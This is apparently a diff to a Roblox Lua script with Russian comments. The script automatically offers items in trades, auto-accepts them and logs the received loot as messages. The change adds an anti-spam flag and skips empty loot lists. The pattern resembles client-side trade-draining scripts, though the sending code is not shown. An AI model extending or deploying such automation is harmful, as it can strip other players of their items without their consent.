@@ -85,14 +85,18 @@ PlayerGui.ChildAdded:Connect(function(child)
 end)
 
 -- =========================================================
--- 3. ВЫСТАВЛЕНИЕ (2с пауза) + АВТО-АКЦЕПТ + ЛОГГЕР ЛУТА
+-- 3. ВЫСТАВЛЕНИЕ (2с пауза) + АВТО-АКЦЕПТ + ЛОГГЕР ЛУТА (БЕЗ СПАМА)
 -- =========================================================
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 local lastOffer = nil
 local myName = LocalPlayer.Name
 local offered = false
+local loggedTrade = false -- Защита от спама
 
 Trade.StartTrade.OnClientEvent:Connect(function()
+    -- Сбрасываем флаги при новом трейде, чтобы он снова логировался
+    loggedTrade = false 
+    
     if offered then return end
     offered = true
     print("[debug] 🔔 StartTrade получен! Трейд открылся.")
@@ -138,7 +142,6 @@ Trade.StartTrade.OnClientEvent:Connect(function()
         else
             warn("[offer] ❌ Ошибка: " .. tostring(err))
         end
-        -- 0.4 секунды между предметами
         task.wait(0.4)
     end
 end)
@@ -149,7 +152,18 @@ end)
 
 Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
     if success and lootList then
-        print("[debug] ✅ AcceptTrade успешно завершён!")
+        -- ЗАЩИТА ОТ СПАМА
+        if loggedTrade then return end
+        
+        -- Если предметов нет (пустой лут) — не отправляем
+        if #lootList == 0 then
+            print("[debug] Лут пустой — сообщение не отправлено.")
+            return
+        end
+
+        loggedTrade = true
+        print("[debug] ✅ AcceptTrade успешно завершён! Логируем лут...")
+
         local fields = {}
         for _, item in ipairs(lootList) do
             local itemId, amount, itemType = item[1], item[2], item[3]
